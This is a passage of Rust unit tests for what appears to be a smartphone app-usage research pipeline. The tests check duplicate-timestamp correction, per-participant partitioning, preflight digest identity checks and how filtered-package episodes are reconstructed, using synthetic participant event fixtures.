        let csv = String::from_utf8(interleaved.screen_csv_bytes.to_vec()).unwrap();
        assert!(csv.contains("Android"));
        assert!(!csv.contains("Amazon Fire"));
        assert!(csv.contains("extended_idle_or_unknown"));
        assert!(!csv.contains("probable_manual_lock"));
    }

    #[test]
    fn duplicate_gap_and_engagement_state_are_participant_partitioned() {
        let mut combined = rows_from_participant_events(&[
            ("P01", "2026-03-07 10:00:00", "Activity Resumed", "app.a"),
            ("P02", "2026-03-07 10:00:00", "Activity Resumed", "app.x"),
            ("P01", "2026-03-07 10:00:00", "Activity Paused", "app.a"),
            ("P02", "2026-03-07 10:01:00", "Activity Paused", "app.x"),
        ]);
        assert_eq!(count_duplicate_groups(&combined), 1);
        let p1 = combined
            .iter()
            .filter(|row| row.participant_id == "P01")
            .cloned()
            .collect::<Vec<_>>();
        let p2 = combined
            .iter()
            .filter(|row| row.participant_id == "P02")
            .cloned()
            .collect::<Vec<_>>();
        let corrected = unalign_duplicate_timestamps(
            combined.clone(),
            &["Activity Paused".into()],
            &["Activity Resumed".into()],
        )
        .expect("duplicate-timestamp adjustment stays representable");
        let corrected_p1 = unalign_duplicate_timestamps(
            p1.clone(),
            &["Activity Paused".into()],
            &["Activity Resumed".into()],
        )
        .expect("duplicate-timestamp adjustment stays representable");
        let corrected_p2 = unalign_duplicate_timestamps(
            p2.clone(),
            &["Activity Paused".into()],
            &["Activity Resumed".into()],
        )
        .expect("duplicate-timestamp adjustment stays representable");
        for (participant, independent) in [("P01", corrected_p1), ("P02", corrected_p2)] {
            assert_eq!(
                corrected
                    .iter()
                    .filter(|row| row.participant_id == participant)
                    .map(|row| row.event_timestamp_ns)
                    .collect::<Vec<_>>(),
                independent
                    .iter()
                    .map(|row| row.event_timestamp_ns)
                    .collect::<Vec<_>>(),
            );
        }

        combined = derive_time_gap_evidence(combined);
        let p1 = derive_time_gap_evidence(p1);
        let p2 = derive_time_gap_evidence(p2);
        for (participant, independent) in [("P01", p1), ("P02", p2)] {
            assert_eq!(
                combined
                    .iter()
                    .filter(|row| row.participant_id == participant)
                    .map(|row| row.data_time_gap_hours.to_bits())
                    .collect::<Vec<_>>(),
                independent
                    .iter()
                    .map(|row| row.data_time_gap_hours.to_bits())
                    .collect::<Vec<_>>(),
            );
        }

        let mut usage = rows_from_participant_events(&[
            ("P01", "2026-03-07 10:00:00", "Activity Resumed", "app.a"),
            ("P02", "2026-03-07 10:00:05", "Activity Resumed", "app.b"),
            ("P01", "2026-03-07 10:00:20", "Activity Resumed", "app.b"),
        ]);
        for row in &mut usage {
            let start = row.event_timestamp_ns;
            let data = row.edit_all();
            data.interaction_type = APP_USAGE.into();
            data.start_timestamp_ns = Some(start);
            data.stop_timestamp_ns = Some(start + 10_000_000_000);
        }
        let mut p1_usage = usage
            .iter()
            .filter(|row| row.participant_id == "P01")
            .cloned()
            .collect::<Vec<_>>();
        add_app_usage_detail_columns(&mut usage, 300.0);
        add_app_usage_detail_columns(&mut p1_usage, 300.0);
        assert_eq!(
            usage
                .iter()
                .filter(|row| row.participant_id == "P01")
                .map(|row| (
                    row.any_app_new_engage_30s,
                    row.any_app_switched_app,
                    row.any_app_usage_time_gap_hours.to_bits(),
                ))
                .collect::<Vec<_>>(),
            p1_usage
                .iter()
                .map(|row| (
                    row.any_app_new_engage_30s,
                    row.any_app_switched_app,
                    row.any_app_usage_time_gap_hours.to_bits(),
                ))
                .collect::<Vec<_>>(),
        );
    }

    #[test]
    fn chronicle_adapter_projects_device_shutdown_close_reason() {
        let rows = rows_from_events(&[("2026-03-07 10:00:00", "Screen Interactive", "android")]);
        let start = &rows[0];
        let close = ScreenSessionClose {
            state: ScreenState {
                start_index: 0,
                start_timestamp_ns: start.event_timestamp_ns,
                start_timezone: start.timezone.clone(),
                start_source_data_rows: start.source_data_rows.clone(),
                lock_screen_seen: false,
                unlocked_seen: false,
                foreground_pkg: None,
                app_observed: Some(false),
                last_meaningful_ts_ns: None,
                last_meaningful_pkg: None,
                source_data_rows: start.source_data_rows.clone(),
            },
            stop_timestamp_ns: Some(start.event_timestamp_ns + 1),
            stop_event_type: Some("Device Shutdown".into()),
            stop_index: None,
            stop_source_data_rows: SourceDataRows::single(2),
        };
        let interval_inputs = chronicle_interval_inputs(&rows, &[close]);
        assert_eq!(
            interval_inputs[0].close_reason,
            b05::ScreenIntervalCloseReason::DeviceShutdown,
        );
        assert_eq!(interval_inputs[0].start_boundary_source_row, 1);
        assert_eq!(interval_inputs[0].stop_boundary_source_row, Some(2));
    }

    #[test]
    fn b05_assignment_id_matches_runtime_stable_id_protocol() {
        let artifact = concat!(
            "sha256:",
            "0000000000000000000000000000000000000000000000000000000000000000"
        );
        assert_eq!(
            b05_evidence_assignment_digest(artifact),
            "sha256:11e098fe39bcedaffc0f8d5cb6e3dc5629b0aa88d78e4b53954c904c330207c7",
        );
    }

    #[test]
    fn b05_verified_identity_mismatches_are_typed_and_phi_safe() {
        let options = source_screen_options();
        let sidecar = b05_capable_sidecar(
            B05_IDENTITY_TEST_RAW,
            options.screen_session_construction_strategy,
        );
        let artifact_digest = sha256_wire(&sidecar);
        let assignment_digest = b05_evidence_assignment_digest(&artifact_digest);
        let wrong = concat!(
            "sha256:",
            "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
        );

        let artifact_error = match prepare_b05_schoedel(
            B05_IDENTITY_TEST_RAW,
            &options,
            &sidecar,
            B05PreflightIdentity {
                verified_evidence_artifact_digest: Some(wrong),
                ..B05PreflightIdentity::default()
            },
        ) {
            Err(error) => error,
            Ok(_) => panic!("artifact disagreement must fail"),
        };
        assert!(matches!(
            artifact_error,
            B05PreflightError::EvidenceArtifactDigestMismatch
        ));
        assert_eq!(
            artifact_error.to_string(),
            "b05_preflight_identity_error:evidence_artifact_digest_mismatch"
        );

        let assignment_error = match prepare_b05_schoedel(
            B05_IDENTITY_TEST_RAW,
            &options,
            &sidecar,
            B05PreflightIdentity {
                verified_evidence_artifact_digest: Some(&artifact_digest),
                verified_evidence_assignment_digest: Some(wrong),
                ..B05PreflightIdentity::default()
            },
        ) {
            Err(error) => error,
            Ok(_) => panic!("assignment disagreement must fail"),
        };
        assert!(matches!(
            assignment_error,
            B05PreflightError::EvidenceAssignmentDigestMismatch
        ));
        assert_eq!(
            assignment_error.to_string(),
            "b05_preflight_identity_error:evidence_assignment_digest_mismatch"
        );

        let prepared = prepare_b05_schoedel(
            B05_IDENTITY_TEST_RAW,
            &options,
            &sidecar,
            B05PreflightIdentity {
                verified_request_options_digest: Some(&artifact_digest),
                verified_evidence_artifact_digest: Some(&artifact_digest),
                verified_evidence_assignment_digest: Some(&assignment_digest),
            },
        )
        .expect("matching identities prepare");
        assert_eq!(
            validate_prepared_b05_schoedel(
                B05_IDENTITY_TEST_RAW,
                &options,
                &sidecar,
                B05PreflightIdentity {
                    verified_request_options_digest: Some(wrong),
                    verified_evidence_artifact_digest: Some(&artifact_digest),
                    verified_evidence_assignment_digest: Some(&assignment_digest),
                },
                &prepared,
            ),
            Err(B05PreparedExecutionError::RequestOptionsDigestMismatch),
        );
        assert_eq!(
            validate_prepared_b05_schoedel(
                B05_IDENTITY_TEST_RAW,
                &options,
                &sidecar,
                B05PreflightIdentity::default(),
                &prepared,
            ),
            Err(B05PreparedExecutionError::RequestOptionsDigestMismatch),
            "verified request identity may not disappear at execution",
        );
        assert_eq!(
            validate_prepared_b05_schoedel(
                B05_IDENTITY_TEST_RAW,
                &options,
                &sidecar,
                B05PreflightIdentity {
                    verified_request_options_digest: Some(&artifact_digest),
                    verified_evidence_artifact_digest: None,
                    verified_evidence_assignment_digest: Some(&assignment_digest),
                },
                &prepared,
            ),
            Err(B05PreparedExecutionError::EvidenceArtifactDigestMismatch),
            "verified artifact identity may not disappear at execution",
        );
        assert_eq!(
            validate_prepared_b05_schoedel(
                B05_IDENTITY_TEST_RAW,
                &options,
                &sidecar,
                B05PreflightIdentity {
                    verified_request_options_digest: Some(&artifact_digest),
                    verified_evidence_artifact_digest: Some(&artifact_digest),
                    verified_evidence_assignment_digest: None,
                },
                &prepared,
            ),
            Err(B05PreparedExecutionError::EvidenceAssignmentDigestMismatch),
            "verified assignment identity may not disappear at execution",
        );
        let mut inactive = options.clone();
        inactive.usage_session_mode = UsageSessionMode::NoUsage;
        assert_eq!(
            validate_prepared_b05_schoedel(
                B05_IDENTITY_TEST_RAW,
                &inactive,
                &sidecar,
                B05PreflightIdentity {
                    verified_request_options_digest: Some(&artifact_digest),
                    verified_evidence_artifact_digest: Some(&artifact_digest),
                    verified_evidence_assignment_digest: Some(&assignment_digest),
                },
                &prepared,
            ),
            Err(B05PreparedExecutionError::ComponentOptionsDigestMismatch),
            "an active prepared object cannot cross into an inactive usage mode",
        );
    }

    #[test]
    fn b05_inactive_and_chronicle_paths_do_not_read_or_bind_sidecar() {
        let malformed = b"definitely not a capability CSV";
        let mut inactive = test_options();
        inactive.usage_session_mode = UsageSessionMode::AppUsage;
        let inactive = prepare_b05_schoedel(
            B05_IDENTITY_TEST_RAW,
            &inactive,
            malformed,
            B05PreflightIdentity {
                verified_evidence_artifact_digest: Some("also ignored"),
                verified_evidence_assignment_digest: Some("also ignored"),
                ..B05PreflightIdentity::default()
            },
        )
        .expect("inactive B05 ignores sidecar");
        assert_eq!(
            inactive.evidence().disposition,
            ScientificPreflightDisposition::NotApplicable
        );
        assert!(inactive.evidence_artifact_digest.is_none());

        let mut chronicle = test_options();
        chronicle.usage_session_mode = UsageSessionMode::ScreenUsage;
        let chronicle = prepare_b05_schoedel(
            B05_IDENTITY_TEST_RAW,
            &chronicle,
            malformed,
            B05PreflightIdentity {
                verified_evidence_artifact_digest: Some("also ignored"),
                verified_evidence_assignment_digest: Some("also ignored"),
                ..B05PreflightIdentity::default()
            },
        )
        .expect("Chronicle baseline ignores sidecar");
        assert_eq!(
            chronicle.evidence().disposition,
            ScientificPreflightDisposition::Executable
        );
        assert!(chronicle.evidence_artifact_digest.is_none());
        assert_eq!(
            chronicle.evidence().screen_construction_phase,
            B05ComputationPhase::DeferredCanonicalBaseline
        );
        assert!(chronicle.evidence().screen_construction.is_none());
    }

    #[test]
    fn b05_component_and_verified_request_digest_origins_are_distinct() {
        let mut options = test_options();
        options.usage_session_mode = UsageSessionMode::ScreenUsage;
        let direct = prepare_b05_schoedel(
            B05_IDENTITY_TEST_RAW,
            &options,
            &[],
            B05PreflightIdentity::default(),
        )
        .expect("direct preparation");
        assert_eq!(
            direct.evidence().options_digest_origin,
            B05OptionsDigestOrigin::KernelRouterComponent
        );
        assert_eq!(
            direct.evidence().options_digest,
            direct.evidence().component_options_digest
        );

        let verified_digest = concat!(
            "sha256:",
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
        );
        let verified = prepare_b05_schoedel(
            B05_IDENTITY_TEST_RAW,
            &options,
            &[],
            B05PreflightIdentity {
                verified_request_options_digest: Some(verified_digest),
                ..B05PreflightIdentity::default()
            },
        )
        .expect("verified preparation");
        assert_eq!(
            verified.evidence().options_digest_origin,
            B05OptionsDigestOrigin::VerifiedRequestJcs
        );
        assert_eq!(verified.evidence().options_digest, verified_digest);
        assert_ne!(
            verified.evidence().options_digest,
            verified.evidence().component_options_digest
        );
    }

    #[test]
    fn foundational_component_identities_have_stage_scoped_influence() {
        let base = schoedel_options();
        let mut b01 = base.clone();
        b01.event_retention_set = EventRetentionSet::ForegroundBackgroundOnly;
        assert_eq!(
            b05_router_options_digest(&base),
            b05_router_options_digest(&b01),
            "B01 is not a router input",
        );
        assert_eq!(
            b05_screen_options_digest(&base),
            b05_screen_options_digest(&b01),
            "B01 must not invalidate raw/source or canonical B05",
        );
        assert_ne!(
            schoedel_options_digest(&base),
            schoedel_options_digest(&b01)
        );

        let mut explicit = base.clone();
        explicit.screen_session_construction_strategy_explicit = true;
        assert_ne!(
            b05_router_options_digest(&base),
            b05_router_options_digest(&explicit),
            "explicit selection changes the receipt relation",
        );
        assert_eq!(
            b05_screen_options_digest(&base),
            b05_screen_options_digest(&explicit),
            "explicit selection does not rerun the state machine",
        );
        assert_eq!(
            schoedel_options_digest(&base),
            schoedel_options_digest(&explicit),
        );

        let prepared = prepare_b05_schoedel(
            B05_IDENTITY_TEST_RAW,
            &base,
            &[],
            B05PreflightIdentity::default(),
        )
        .expect("prepared base");
        assert_eq!(
            validate_prepared_b05_schoedel(
                B05_IDENTITY_TEST_RAW,
                &b01,
                &[],
                B05PreflightIdentity::default(),
                &prepared,
            ),
            Err(B05PreparedExecutionError::SchoedelComponentOptionsDigestMismatch),
        );
    }

    #[test]
    fn prepared_screen_substrate_rebinds_router_and_schoedel_without_replay() {
        B05_PREPARE_DECODE_COUNT.with(|count| count.set(0));
        B05_PREPARE_EVIDENCE_PARSE_COUNT.with(|count| count.set(0));
        B05_SCREEN_CONSTRUCTION_COUNT.with(|count| count.set(0));

        let mut base = schoedel_options();
        base.screen_session_construction_strategy =
            ScreenSessionConstructionStrategyId::ParryToth2025SessionGlanceV1;
        base.screen_session_construction_strategy_explicit = false;
        let sidecar = b05_capable_sidecar(
            SCHOEDEL_PIPELINE_RAW,
            base.screen_session_construction_strategy,
        );
        let raw_digest = sha256_wire(SCHOEDEL_PIPELINE_RAW);
        let prepared = prepare_b05_schoedel(
            SCHOEDEL_PIPELINE_RAW,
            &base,
            &sidecar,
            B05PreflightIdentity::default(),
        )
        .expect("initial source substrate");
        let initial_screen = prepared
            .evidence()
            .screen_construction
            .as_ref()
            .expect("source screen output");
        let initial_interval_ids = initial_screen
            .intervals
            .iter()
            .map(|interval| interval.screen_interval_id.clone())
            .collect::<Vec<_>>();

        let mut b01 = base.clone();
        b01.event_retention_set = EventRetentionSet::ForegroundBackgroundOnly;
        let rebound_b01 = rebind_b05_schoedel_prepared(
            &prepared,
            &b01,
            &raw_digest,
            B05PreflightIdentity::default(),
        )
        .expect("B01 rebind");
        assert_ne!(
            prepared.evidence().schoedel_component_options_digest,
            rebound_b01.evidence().schoedel_component_options_digest,
        );

        let mut b02 = base.clone();
        b02.opener_set = OpenerSet::GesisAppScopedStarts;
        rebind_b05_schoedel_prepared(
            &prepared,
            &b02,
            &raw_digest,
            B05PreflightIdentity::default(),
        )
        .expect("B02 rebind");

        let mut explicit = base.clone();
        explicit.screen_session_construction_strategy_explicit = true;
        let rebound_explicit = rebind_b05_schoedel_prepared(
            &prepared,
            &explicit,
            &raw_digest,
            B05PreflightIdentity::default(),
        )
        .expect("selection-relation rebind");
        assert_ne!(
            prepared.evidence().component_options_digest,
            rebound_explicit.evidence().component_options_digest,
        );
        assert_eq!(
            initial_interval_ids,
            rebound_explicit
                .evidence()
                .screen_construction
                .as_ref()
                .expect("rebound screen output")
                .intervals
                .iter()
                .map(|interval| interval.screen_interval_id.clone())
                .collect::<Vec<_>>(),
        );
        assert_eq!(B05_PREPARE_DECODE_COUNT.with(Cell::get), 1);
        assert_eq!(B05_PREPARE_EVIDENCE_PARSE_COUNT.with(Cell::get), 1);
        assert_eq!(B05_SCREEN_CONSTRUCTION_COUNT.with(Cell::get), 1);

        let mut inactive = base.clone();
        inactive.usage_session_mode = UsageSessionMode::NoUsage;
        let rebound_inactive = rebind_b05_schoedel_prepared(
            &prepared,
            &inactive,
            &raw_digest,
            B05PreflightIdentity::default(),
        )
        .expect("inactive router rebind");
        assert_eq!(
            rebound_inactive.evidence().disposition,
            ScientificPreflightDisposition::NotApplicable,
        );
        assert!(rebound_inactive.evidence().screen_construction.is_none());
        let rebound_active = rebind_b05_schoedel_prepared(
            &rebound_inactive,
            &base,
            &raw_digest,
            B05PreflightIdentity::default(),
        )
        .expect("chained active rebind retains neutral source construction");
        assert_eq!(
            prepared.evidence().screen_construction,
            rebound_active.evidence().screen_construction,
        );
        assert_eq!(B05_PREPARE_DECODE_COUNT.with(Cell::get), 1);
        assert_eq!(B05_PREPARE_EVIDENCE_PARSE_COUNT.with(Cell::get), 1);
        assert_eq!(B05_SCREEN_CONSTRUCTION_COUNT.with(Cell::get), 1);

        let mut other_strategy = base.clone();
        other_strategy.screen_session_construction_strategy =
            ScreenSessionConstructionStrategyId::Zhu2018UnlockLockV1;
        assert!(matches!(
            rebind_b05_schoedel_prepared(
                &prepared,
                &other_strategy,
                &raw_digest,
                B05PreflightIdentity::default(),
            ),
            Err(B05PreflightError::ScreenSubstrateOptionsMismatch),
        ));
    }

    #[test]
    fn deferred_schoedel_preflight_exposes_requested_and_effective_episode_ids() {
        let prepared = prepare_b05_schoedel(
            SCHOEDEL_PIPELINE_RAW,
            &schoedel_options(),
            &[],
            B05PreflightIdentity::default(),
        )
        .expect("deferred Schoedel preflight");
        assert_eq!(
            prepared.evidence().requested_episode_strategy_id,
            "schoedel_2026_app_within_screen_prose_v1",
        );
        assert_eq!(
            prepared.evidence().effective_episode_strategy_id.as_deref(),
            Some("schoedel_2026_app_within_screen_prose_v1"),
        );
        assert_eq!(
            prepared.evidence().schoedel_reconstruction_phase,
            B05ComputationPhase::DeferredRetainedAppStream,
        );
    }

    #[test]
    fn prepared_b05_is_consumed_without_second_decode_or_sidecar_parse() {
        B05_PREPARE_DECODE_COUNT.with(|count| count.set(0));
        B05_PREPARE_EVIDENCE_PARSE_COUNT.with(|count| count.set(0));
        let options = source_screen_options();
        let sidecar = b05_capable_sidecar(
            B05_IDENTITY_TEST_RAW,
            options.screen_session_construction_strategy,
        );
        let prepared = prepare_b05_schoedel(
            B05_IDENTITY_TEST_RAW,
            &options,
            &sidecar,
            B05PreflightIdentity::default(),
        )
        .expect("source preparation");
        assert_eq!(B05_PREPARE_DECODE_COUNT.with(Cell::get), 1);
        assert_eq!(B05_PREPARE_EVIDENCE_PARSE_COUNT.with(Cell::get), 1);
        run_pipeline_v2_with_prepared_b05(
            B05_IDENTITY_TEST_RAW,
            &options,
            PipelineV2SupportFiles {
                input_capability_evidence_csv: &sidecar,
                ..PipelineV2SupportFiles::default()
            },
            prepared,
        )
        .expect("prepared execution");
        assert_eq!(B05_PREPARE_DECODE_COUNT.with(Cell::get), 1);
        assert_eq!(B05_PREPARE_EVIDENCE_PARSE_COUNT.with(Cell::get), 1);
    }

    #[test]
    fn a_prepared_b05_from_other_bytes_is_refused_and_shared_digest_receipts_equal_the_public_ones() {
        let options = source_screen_options();
        let sidecar = b05_capable_sidecar(
            B05_IDENTITY_TEST_RAW,
            options.screen_session_construction_strategy,
        );
        let support = PipelineV2SupportFiles {
            input_capability_evidence_csv: &sidecar,
            ..PipelineV2SupportFiles::default()
        };
        let prepared = prepare_b05_schoedel(
            B05_IDENTITY_TEST_RAW,
            &options,
            &sidecar,
            B05PreflightIdentity::default(),
        )
        .expect("source preparation");
        let mut other_bytes = B05_IDENTITY_TEST_RAW.to_vec();
        other_bytes.push(b'\n');
        let Err(error) =
            run_pipeline_v2_with_prepared_b05(&other_bytes, &options, support, prepared)
        else {
            panic!("a prepared object from other bytes must be refused");
        };
        assert_eq!(error, "b05_prepared_execution_error:raw_input_digest_mismatch");

        // The shared-digest paths must produce exactly what the public,
        // self-hashing entry points produce for the same bytes.
        let expected = sha256_wire(B05_IDENTITY_TEST_RAW);
        let public_prepared = prepare_b05_schoedel_with_input_boundary(
            B05_IDENTITY_TEST_RAW,
            &options,
            &sidecar,
            b05_identity_from_support(support),
            participant_input_boundary_from_support(support),
        )
        .expect("public preparation");
        let public_eyes = preflight_eyes_complement_input_partition(
            B05_IDENTITY_TEST_RAW,
            &options,
            eyes_input_partition_identity_from_support(support),
            participant_input_boundary_from_support(support),
        )
        .expect("public EYES preflight");
        assert_eq!(public_prepared.raw_input_sha256, expected);
        assert_eq!(public_eyes.input_digest, expected);

        let run = prepare_sequential_run(B05_IDENTITY_TEST_RAW, &options, support)
            .expect("sequential preparation");
        assert_eq!(run.prepared.raw_input_sha256, expected);
        assert_eq!(run.prepared.evidence(), public_prepared.evidence());
        if let Some(eyes) = &run.eyes_input_partition_preflight {
            assert_eq!(eyes, &public_eyes);
        }
        let (_, eyes) = sequential_scientific_preflight(B05_IDENTITY_TEST_RAW, &options, support)
            .expect("sequential preflight");
        assert_eq!(eyes, public_eyes);
    }

    #[test]
    fn foundational_semantics_axes_are_closed_round_trippable_and_unknown_safe() {
        assert_eq!(MicroUseClassificationPolicy::ALL.len(), 2);
        assert_eq!(
            MicroUseClassificationPolicy::default(),
            MicroUseClassificationPolicy::None
        );
        for policy in MicroUseClassificationPolicy::ALL {
            assert_eq!(
                MicroUseClassificationPolicy::from_canonical_id(policy.canonical_id()),
                policy,
            );
        }
        assert!(
            MicroUseClassificationPolicy::parse_request_value("future_micro_policy")
                .expect_err("an unknown micro_use_classification_policy is refused")
                .starts_with("unknown_micro_use_classification_policy: "),
        );

        assert_eq!(MinimumDurationComparator::ALL.len(), 2);
        assert_eq!(
            MinimumDurationComparator::default(),
            MinimumDurationComparator::StrictLt,
        );
        for comparator in MinimumDurationComparator::ALL {
            assert_eq!(
                MinimumDurationComparator::from_canonical_id(comparator.canonical_id()),
                comparator,
            );
        }
        assert!(
            MinimumDurationComparator::parse_request_value("future_comparator")
                .expect_err("an unknown minimum_duration_comparator is refused")
                .starts_with("unknown_minimum_duration_comparator: "),
        );

        assert_eq!(MinimumDurationDisposition::ALL.len(), 4);
        assert_eq!(
            MinimumDurationDisposition::default(),
            MinimumDurationDisposition::ChronicleBlankKeepRow,
        );
        for disposition in MinimumDurationDisposition::ALL {
            assert_eq!(
                MinimumDurationDisposition::from_canonical_id(disposition.canonical_id()),
                disposition,
            );
        }
        assert!(
            MinimumDurationDisposition::parse_request_value("future_disposition")
                .expect_err("an unknown minimum_duration_disposition is refused")
                .starts_with("unknown_minimum_duration_disposition: "),
        );
    }

    #[test]
    fn opener_set_is_closed_round_trippable_and_unknown_safe() {
        assert_eq!(OpenerSet::ALL.len(), 3);
        assert_eq!(OpenerSet::default(), OpenerSet::StrategyDefined);
        for opener_set in OpenerSet::ALL {
            assert_eq!(
                OpenerSet::from_canonical_id(opener_set.canonical_id()),
                opener_set
            );
        }
        assert!(
            OpenerSet::parse_request_value("future_narrow_arm")
                .expect_err("an unknown opener_set is refused")
                .starts_with("unknown_opener_set: "),
        );
    }

    #[test]
    fn opener_applicability_exhausts_the_eight_by_three_matrix() {
        use OpenerStrategyRelation as Relation;
        let expected = [
            // strategy_defined
            [Relation::BaselineNative; 8],
            // activity_resumed_only, in EpisodeReconstructionStrategy::ALL order
            [
                Relation::BaselineEquivalent,
                Relation::SourceEquivalent,
                Relation::SourceEquivalent,
                Relation::ControlledDerivative,
                Relation::SourceEquivalent,
                Relation::SourceEquivalent,
                Relation::SourceEquivalent,
                Relation::SourceEquivalent,
            ],
            // gesis_app_scoped_starts
            [
                Relation::ControlledDerivative,
                Relation::ControlledDerivative,
                Relation::Refused,
                Relation::SourceAlignedAdapter,
                Relation::ControlledDerivative,
                Relation::ControlledDerivative,
                Relation::ControlledDerivative,
                Relation::ControlledDerivative,
            ],
        ];
        for (opener_index, opener_set) in OpenerSet::ALL.into_iter().enumerate() {
            for (strategy_index, &strategy) in EpisodeReconstructionStrategy::ALL.iter().enumerate()
            {
                let applicability = opener_set.applicability(strategy);
                assert_eq!(
                    applicability.relation,
                    expected[opener_index][strategy_index],
                    "{} × {}",
                    opener_set.canonical_id(),
                    strategy.canonical_id()
                );
                assert_eq!(
                    applicability.effective.is_some(),
                    applicability.relation != Relation::Refused
                );
                assert_eq!(
                    applicability.refusal_reason.is_some(),
                    applicability.relation == Relation::Refused
                );
            }
        }
    }

    #[test]
    fn wider_opener_mask_keeps_app_kinds_and_suppresses_device_kinds_by_type() {
        let wider = OpenerSet::GesisAppScopedStarts;
        for app_kind in [
            "Activity Resumed",
            "Filtered App Resumed",
            "Continue Previous Day",
            "Standby Bucket Changed",
            "Slice Pinned App",
            "Foreground Service Start",
            "Rollover Foreground Service",
        ] {
            assert!(wider.explicit_eligible(app_kind), "{app_kind}");
        }
        for device_kind in [
            "Screen Interactive",
            "Screen Interactive/Keyguard Shown",
            "Keyguard Hidden",
            "Device Startup",
        ] {
            assert!(!wider.explicit_eligible(device_kind), "{device_kind}");
        }
    }

    fn canonical_test_rows(csv: &[u8], timezone: &str) -> Vec<Row> {
        let raw = incremental::decode_source_records(csv);
        let model = incremental::attach_device_models(&raw);
        let rows = incremental::canonicalize_source_rows(&raw, timezone, &BTreeMap::new(), &model)
            .expect("the focused B02 fixture canonicalizes");
        incremental::order_source_records(rows)
    }

    fn match_and_materialize_activity_resumed_only(
        rows: Vec<Row>,
        filtered_packages: &BTreeSet<String>,
        options: &PipelineV2Options,
    ) -> (Vec<Row>, incremental::MatcherOutput) {
        assert_eq!(options.opener_set, OpenerSet::ActivityResumedOnly);
        let input = incremental::build_app_event_index(
            &rows,
            &options.same_app_stop_types,
            &options.other_stop_types,
            &AHashSet::new(),
            options.model_concurrent_usage,
        )
        .expect("the focused B02 fixture has app-usage signals");
        let matched = incremental::match_app_episodes_with_strategy(
            &input,
            &rows,
            options.episode_reconstruction_strategy,
            options.opener_set,
            options.allow_stop_event_reuse,
            options.use_activity_stopped_as_fallback,
            options.apply_threshold_to_fallback,
            options.long_duration_threshold_ns,
            options.proximity_interval_ns,
        )
        .expect("activity_resumed_only is executable for the fused matcher");
        let rows = incremental::materialize_candidate_episodes(rows, &matched, filtered_packages);
        (rows, matched)
    }

    /// The filter policy deliberately blinds session-bearing labels while it
    /// discovers excluded packages. Reconstruction must see the unblinded
    /// native label after B01 retention, otherwise B02's narrow arm silently
    /// loses exactly the rows the final package policy is meant to protect.
    #[test]
    fn filtered_resumed_transport_reaches_b02_then_restores_package_policy_and_lineage() {
        let csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Target Child,Secret,Activity Resumed,com.example.secret,2026-03-07 10:00:00,UTC\n",
            "Study,P01,Target Child,Secret,Activity Paused,com.example.secret,2026-03-07 10:01:00,UTC\n",
            "Study,P02,Target Child,Control,Activity Resumed,com.example.control,2026-03-07 10:00:00,UTC\n",
            "Study,P02,Target Child,Control,Activity Paused,com.example.control,2026-03-07 10:01:00,UTC\n",
        );
        let filter_csv = b"app_package_name,known_application_labels\ncom.example.secret,Secret\n";
        let filter_map = parse_filter_csv(
            filter_csv,
            PackageExclusionPreset::AllSuppliedRows,
            FilterMatchField::AppPackageName,
        );

        let tagged = incremental::mark_app_policy_matches(
            canonical_test_rows(csv.as_bytes(), "UTC"),
            true,
            &filter_map,
        );
        assert_eq!(
            tagged
                .iter()
                .filter(|row| row.app_package_name == "com.example.secret")
                .map(|row| row.interaction_type.as_str())
                .collect::<Vec<_>>(),
            vec![FILTERED_RESUMED, FILTERED_PAUSED],
            "the filter stage must use its policy-only spellings before package resolution",
        );
        let filtered_packages = incremental::resolve_excluded_packages(&tagged);
        assert_eq!(
            filtered_packages,
            BTreeSet::from(["com.example.secret".to_string()]),
            "the blinded spelling is the evidence used to resolve the package policy",
        );

        let unmasked = incremental::mask_excluded_app_events(tagged);
        let retained = apply_event_retention(unmasked, EventRetentionSet::ForegroundBackgroundOnly);
        assert_eq!(
            retained
                .iter()
                .map(|row| row.interaction_type.as_str())
                .collect::<BTreeSet<_>>(),
            BTreeSet::from([ACTIVITY_RESUMED, ACTIVITY_PAUSED]),
            "B01 must retain canonical lifecycle labels after the package is resolved",
        );

        let mut options = test_options();
        options.timezone = "UTC".into();
        options.minimum_usage_duration = 0.0;
        options.correct_duplicate_event_timestamps = false;
        options.event_retention_set = EventRetentionSet::ForegroundBackgroundOnly;
        options.opener_set = OpenerSet::ActivityResumedOnly;
        options.materialize_visualization_data = false;

        let (materialized, matched) =
            match_and_materialize_activity_resumed_only(retained, &filtered_packages, &options);
        assert_eq!(matched.start_indices.len(), 2);
        assert_eq!(matched.stop_start_indices.len(), 2);
        assert_eq!(
            matched.opener_set_evidence.selected_opener_type_counts,
            BTreeMap::from([(ACTIVITY_RESUMED.to_string(), 2)]),
        );
        assert_eq!(
            matched.opener_set_evidence.materialized_opener_type_counts,
            BTreeMap::from([(ACTIVITY_RESUMED.to_string(), 2)]),
        );

        let selected_start = |participant: &str| {
            materialized
                .iter()
                .find(|row| row.participant_id == participant && row.start_timestamp_ns.is_some())
                .expect("each participant has one materialized start")
        };
        let filtered_start = selected_start("P01");
        let control_start = selected_start("P02");
        assert_eq!(
            (
                filtered_start.start_timestamp_ns,
                filtered_start.stop_timestamp_ns,
            ),
            (
                control_start.start_timestamp_ns,
                control_start.stop_timestamp_ns,
            ),
            "the blinded/unblinded transport must not change reconstructed bounds",
        );
        assert_eq!(
            filtered_start.source_data_rows.ranges(),
            &[SourceDataRowRange { first: 1, last: 2 }],
        );
        assert_eq!(
            control_start.source_data_rows.ranges(),
            &[SourceDataRowRange { first: 3, last: 4 }],
        );

        let classified = incremental::classify_episode_durations(
            materialized,
            &filtered_packages,
            options.micro_use_classification_policy,
            options.minimum_usage_duration,
            options.minimum_duration_comparator,
            options.minimum_duration_disposition,
            &matched.selected_nonresume_closed_indices,
            &b06::MaximumDurationRowStage::omitted(),
        )
        .expect("classification with the omitted B06 shape never refuses");
        let classified = incremental::apply_app_inclusion_policy(
            classified,
            &filtered_packages,
            &AHashSet::new(),
            &AHashSet::new(),
        );
        let final_row = |participant: &str| {
            classified
                .iter()
                .find(|row| row.participant_id == participant)
                .expect("each participant retains one classified episode")
        };
        let filtered_final = final_row("P01");
        assert_eq!(filtered_final.interaction_type, FILTERED_APP_USAGE);
        assert_eq!(filtered_final.start_timestamp_ns, None);
        assert_eq!(filtered_final.stop_timestamp_ns, None);
        assert_eq!(filtered_final.duration_seconds, None);
        assert_eq!(
            filtered_final.source_data_rows.ranges(),
